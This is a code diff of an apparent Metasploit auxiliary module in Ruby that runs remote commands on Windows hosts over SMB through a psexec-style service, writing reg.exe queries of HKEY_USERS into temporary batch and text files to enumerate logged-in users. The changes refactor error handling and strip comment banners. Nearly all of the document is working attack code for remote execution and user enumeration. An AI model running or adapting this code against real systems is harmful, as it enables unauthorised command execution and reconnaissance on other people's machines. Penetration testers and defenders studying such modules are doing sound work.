@@ -46,9 +46,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#----------------------------------------
 	# This is the main controller function
-	#----------------------------------------
 	def run_host(ip)
 		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
 		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
@@ -70,24 +68,21 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
-		begin
-			keys = get_hku(ip, smbshare, cmd, text, bat)
-			keys.each do |key|
-				check_hku_entry(key, ip, smbshare, cmd, text, bat)
-			end
+		keys = get_hku(ip, smbshare, cmd, text, bat)
+		if !keys
 			cleanup_after(smbshare, ip, cmd, text, bat)
-		rescue StandardError => bang
-			print_error("#{ip} - There was an error #{bang}")
-			return bang
+			return
 		end
+		keys.each do |key|
+			check_hku_entry(key, ip, smbshare, cmd, text, bat)
+		end
+		cleanup_after(smbshare, ip, cmd, text, bat)
 	end
 
 
 
-	#---------------------------------------------------------------------------------------
 	# This method runs reg.exe query HKU to get a list of each key within the HKU master key
 	# Returns an array object
-	#---------------------------------------------------------------------------------------
 	def get_hku(ip, smbshare, cmd, text, bat)
 		begin
 			# Try and query HKU
@@ -100,15 +95,13 @@ class Metasploit3 < Msf::Auxiliary
 			return cleanout
 		rescue StandardError => hku_error
 			print_error("#{ip} - Error runing query against HKU. #{hku_error.class}. #{hku_error}")
-			return hku_error
+			return nil
 		end
 	end
 
 
 
-	#-----------------------------------------------------------------------------
 	# This method will retrive output from a specified textfile on the remote host
-	#-----------------------------------------------------------------------------
 	def get_output(ip, smbshare, file)
 		begin
 			simple.connect("\\\\#{ip}\\#{smbshare}")
@@ -119,41 +112,44 @@ class Metasploit3 < Msf::Auxiliary
 			return output
 		rescue StandardError => output_error
 			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
-			return
+			return nil
 		end
 	end
 
 
 
-	#--------------------------------------------------------------------------
 	# This method checks a provided HKU entry to determine if it is a valid SID
 	# Either returns nil or returns the name of a valid user
-	#--------------------------------------------------------------------------
 	def check_hku_entry(key, ip, smbshare, cmd, text, bat)
 		begin
 			key = key.split("HKEY_USERS\\")[1].chomp
 			command = "#{cmd} /C echo reg.exe QUERY \"HKU\\#{key}\\Volatile Environment\" ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
 			simple.connect(smbshare)
 			psexec(smbshare, command)
-			output = get_output(ip, smbshare, text)
-			domain, username = "",""
-			# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
-			if datastore['USERNAME'].length > 0
+			if output = get_output(ip, smbshare, text)
+				domain, username = "",""
+				# Run this IF loop and only check for specified user if datastore['USERNAME'] is specified
+				if datastore['USERNAME'].length > 0
+					output.each_line do |line|
+						username = line if line.include?("USERNAME")
+						domain = line if line.include?("USERDOMAIN")
+					end
+					if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
+						print_good("#{datastore['USERNAME']} logged into #{ip}")
+					end
+					return
+				end
 				output.each_line do |line|
-					username = line if line.include?("USERNAME")
 					domain = line if line.include?("USERDOMAIN")
+					username = line if line.include?("USERNAME")
 				end
-				if domain.split(" ")[2].to_s.chomp + "\\" + username.split(" ")[2].to_s.chomp == datastore['USERNAME']
-					print_good("#{datastore['USERNAME']} logged into #{ip}")
+				if username.length > 0 && domain.length > 0
+					print_good("#{ip} -  #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+				else
+					print_status("#{ip} - Unable to determine user information for user: #{key}")
 				end
-				return
-			end
-			output.each_line do |line|
-				domain = line if line.include?("USERDOMAIN")
-				username = line if line.include?("USERNAME")
-			end
-			if username && domain
-				print_good("#{ip} -  #{domain.split(" ")[2].to_s}\\#{username.split(" ")[2].to_s}")
+			else
+				print_status("#{ip} - Could not determine logged in users")
 			end
 		rescue StandardError => check_error
 			print_error("#{ip} - Error checking reg key. #{check_error.class}. #{check_error}")
@@ -163,9 +159,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#---------------------------------------------------------------------------------------
 	# Cleanup module.  Gets rid of .txt and .bat files created in the WINDOWS\Temp directory
-	#---------------------------------------------------------------------------------------
 	def cleanup_after(smbshare, ip, cmd, text, bat)
 		begin
 			# Try and do cleanup command
@@ -181,10 +175,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
 
-	#------------------------------------------------------------------------------------------------------------------------
 	# This code was stolen straight out of psexec.rb.  Thanks very much HDM and all who contributed to that module!!
 	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
-	#------------------------------------------------------------------------------------------------------------------------
 	def psexec(smbshare, command)
 		filename = "filename"
 		servicename = "servicename"
